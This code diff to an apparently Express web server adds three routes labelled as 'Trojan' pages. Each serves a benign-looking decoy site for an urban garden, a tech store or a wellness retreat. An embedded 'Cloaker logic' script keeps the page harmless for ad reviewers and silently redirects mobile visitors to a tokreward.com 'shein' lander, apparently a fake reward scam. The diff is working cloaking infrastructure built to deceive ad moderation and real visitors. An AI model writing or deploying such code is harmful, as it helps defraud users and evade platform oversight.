@@ -1759,7 +1759,114 @@ app.get('/9054/:slug', (req, res, next) => {
     console.log(`Served 905 Trojan (${slug})`);
 });
 
-
+// SHEIN BH FLUENT
+app.get('/9055/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=905`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Urban Garden</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Helvetica Neue', Arial, sans-serif;
+                    background-color: #f0f4f8;
+                    color: #2c3e50;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #27ae60;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    border-radius: 0 0 10px 10px;
+                }
+                .garden-grid {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .garden-item {
+                    background-color: white;
+                    border-radius: 10px;
+                    padding: 1.5em;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                .garden-item img {
+                    max-width: 100%;
+                    border-radius: 5px;
+                }
+                footer {
+                    background-color: #27ae60;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                    border-radius: 10px 10px 0 0;
+                }
+                footer a {
+                    color: #f0f4f8;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Urban Oasis</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Cultivate Your City Space</h2>
+                    <p>Transform your urban dwelling into a lush paradise with ${slug} Urban Garden. Discover innovative solutions for green living in the heart of the city.</p>
+                    <div class="garden-grid">
+                        <div class="garden-item">
+                            <img src="https://placehold.co/300x200/27ae60/ffffff?text=Vertical+Garden" alt="Vertical Garden">
+                            <h3>Vertical Gardens</h3>
+                            <p>Maximize your space with our sleek vertical garden systems, perfect for balconies and small patios.</p>
+                        </div>
+                        <div class="garden-item">
+                            <img src="https://placehold.co/300x200/27ae60/ffffff?text=Herb+Kit" alt="Herb Kit">
+                            <h3>Gourmet Herb Kits</h3>
+                            <p>Grow your own fresh herbs year-round with our easy-to-use indoor herb garden kits.</p>
+                        </div>
+                        <div class="garden-item">
+                            <img src="https://placehold.co/300x200/27ae60/ffffff?text=Smart+Planter" alt="Smart Planter">
+                            <h3>Smart Planters</h3>
+                            <p>Our IoT-enabled planters monitor soil conditions and water your plants automatically.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Grow with ${slug} &copy; 2024 ${slug} Urban Garden | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 905 Trojan (${slug})`);
+});
 
 // SHEIN BH FLUENT
 app.get('/876/:slug', (req, res, next) => {
@@ -2762,6 +2869,116 @@ app.get('/9474/:slug', (req, res, next) => {
             console.log(`Served 947 Trojan (${slug})`);
 });
 
+// SHEIN BH FLUENT
+app.get('/9475/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Tech Innovations</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Roboto', sans-serif;
+                    background-color: #ecf0f1;
+                    color: #34495e;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #3498db;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+                }
+                .tech-showcase {
+                    display: flex;
+                    flex-wrap: wrap;
+                    justify-content: space-around;
+                    margin-top: 2em;
+                }
+                .tech-item {
+                    flex-basis: 30%;
+                    background-color: white;
+                    margin-bottom: 2em;
+                    padding: 1.5em;
+                    border-radius: 8px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                .tech-item img {
+                    max-width: 100%;
+                    border-radius: 5px;
+                }
+                footer {
+                    background-color: #3498db;
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                }
+                footer a {
+                    color: #ecf0f1;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Future Tech</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Explore Tomorrow's Technology Today</h2>
+                    <p>${slug} Tech Innovations brings you cutting-edge gadgets and solutions that are shaping the future. Discover how we're making the world smarter, faster, and more connected.</p>
+                    <div class="tech-showcase">
+                        <div class="tech-item">
+                            <img src="https://placehold.co/300x200/3498db/ffffff?text=AI+Assistant" alt="AI Assistant">
+                            <h3>Neural Link AI</h3>
+                            <p>Experience the next generation of AI assistants with our Neural Link technology, offering unprecedented natural language understanding.</p>
+                        </div>
+                        <div class="tech-item">
+                            <img src="https://placehold.co/300x200/3498db/ffffff?text=Quantum+Computer" alt="Quantum Computer">
+                            <h3>Quantum Leap Computer</h3>
+                            <p>Our compact quantum computer brings unparalleled processing power to solve complex problems in minutes.</p>
+                        </div>
+                        <div class="tech-item">
+                            <img src="https://placehold.co/300x200/3498db/ffffff?text=Holographic+Display" alt="Holographic Display">
+                            <h3>HoloVision Pro</h3>
+                            <p>Transform your space with our advanced holographic display, creating immersive 3D environments for work and entertainment.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Innovate with ${slug} &copy; 2024 ${slug} Tech Innovations | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
 
 
 // SHEIN BH FLUENT
@@ -3325,6 +3542,117 @@ app.get('/9484/:slug', (req, res, next) => {
             </div>
             <footer>
                 <p>Feel the music with ${slug} &copy; 2024 ${slug} Music Festival | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 948 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
+app.get('/9485/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=948`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug} Wellness Retreat</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Lato', sans-serif;
+                    background-color: #f5f5f5;
+                    color: #333;
+                }
+                .container {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background: linear-gradient(135deg, #43cea2, #185a9d);
+                    color: white;
+                    text-align: center;
+                    padding: 2em;
+                }
+                .retreat-offerings {
+                    display: grid;
+                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+                    gap: 2em;
+                    margin-top: 2em;
+                }
+                .retreat-item {
+                    background-color: white;
+                    border-radius: 10px;
+                    padding: 1.5em;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                    text-align: center;
+                }
+                .retreat-item img {
+                    max-width: 100%;
+                    border-radius: 50%;
+                    width: 150px;
+                    height: 150px;
+                    object-fit: cover;
+                }
+                footer {
+                    background: linear-gradient(135deg, #185a9d, #43cea2);
+                    color: white;
+                    text-align: center;
+                    padding: 1em;
+                    margin-top: 2em;
+                }
+                footer a {
+                    color: #f5f5f5;
+                    text-decoration: none;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Harmony Haven</h1>
+            </header>
+            <div class="container">
+                <main>
+                    <h2>Rejuvenate Your Mind, Body, and Soul</h2>
+                    <p>Welcome to ${slug} Wellness Retreat, where tranquility meets transformation. Immerse yourself in a world of holistic healing and self-discovery.</p>
+                    <div class="retreat-offerings">
+                        <div class="retreat-item">
+                            <img src="https://placehold.co/150x150/43cea2/ffffff?text=Yoga" alt="Yoga">
+                            <h3>Mindful Yoga</h3>
+                            <p>Connect with your inner self through our expert-led yoga sessions, suitable for all levels.</p>
+                        </div>
+                        <div class="retreat-item">
+                            <img src="https://placehold.co/150x150/185a9d/ffffff?text=Spa" alt="Spa">
+                            <h3>Luxurious Spa</h3>
+                            <p>Indulge in our world-class spa treatments, designed to relax and rejuvenate your body.</p>
+                        </div>
+                        <div class="retreat-item">
+                            <img src="https://placehold.co/150x150/43cea2/ffffff?text=Meditation" alt="Meditation">
+                            <h3>Guided Meditation</h3>
+                            <p>Find inner peace with our guided meditation sessions in serene natural settings.</p>
+                        </div>
+                    </div>
+                </main>
+            </div>
+            <footer>
+                <p>Find balance with ${slug} &copy; 2024 ${slug} Wellness Retreat | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
             </footer>
         </body>
         </html>
